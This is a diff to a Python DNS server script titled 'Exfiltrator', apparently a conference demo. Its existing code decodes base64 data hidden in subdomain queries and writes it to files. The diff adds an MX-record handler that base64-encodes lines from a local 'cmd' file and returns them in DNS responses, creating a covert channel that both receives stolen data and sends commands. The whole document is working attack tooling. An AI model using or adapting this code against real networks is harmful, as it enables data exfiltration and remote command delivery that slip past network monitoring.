@@ -1,13 +1,14 @@
-#!/usr/bin/env python
-
 # Written by Cory Schwartz
 
 import base64
 from time import sleep
-from dnslib import DNSRecord, RR, QTYPE, A
+from dnslib import DNSRecord, RR, QTYPE, A, MX
 from SocketServer import BaseRequestHandler, UDPServer
 
-class Exfiltrator(BaseRequestHandler):
+IP_ADDRESS='192.168.122.102'
+DOMAIN_NAME='def.con'
+
+class Exfiltrator(BaseRequestHandler, object):
     '''
     Use subdomains to exfiltrate data from DNS querries.
     The first two parts of the domain will be used to send data
@@ -16,21 +17,37 @@ class Exfiltrator(BaseRequestHandler):
     will be ignored, so DNS should be configured up to that point.
     <data>.<filename>.real.domain.com
     '''
+    def __init__(self, *args):
+        self.q_processors = {
+            1: self._A,
+	    15: self._MX
+	    }
+	super(Exfiltrator, self).__init__(*args)
+    def _A(self, name):
+        '''
+	A Records.
+	Base64 decode message. Save to file. Send bogus response.
+	'''
+	q = name.label
+        with open(q[1], 'a+b') as f:
+            f.write(base64.b64decode(q[0]))
+	print("A Record: {r}".format(r=str(name)))
+	return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
+    def _MX(self, name):
+        '''
+	MX Records.
+	Read message from file. Base64 encode it. Send the response.
+	'''
+	with open('cmd') as f:
+	    cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
+	print("MX Record: {r} sending {c}".format(r=str(name), c=cmd))
+	return RR(name, QTYPE.MX, rdata=MX(cmd + "." + DOMAIN_NAME), ttl=0)
     def handle(self):
         request = DNSRecord.parse(self.request[0])
         socket = self.request[1]
-	
-        # Read question
         reply = request.reply()
-	qname = reply.questions[0].qname.idna()
-
-        # Write to file
-	q = qname.split('.')
-        with open(q[1], 'a+b') as f:
-            f.write(base64.b64decode(q[0]))
-
-        # Send bogus response
-	reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.122.102'), ttl=0))
+	answer = self.q_processors[reply.q.qtype](reply.q.qname)
+	reply.add_answer(answer)
 	socket.sendto(reply.pack(), self.client_address)
 
 if __name__ == '__main__':
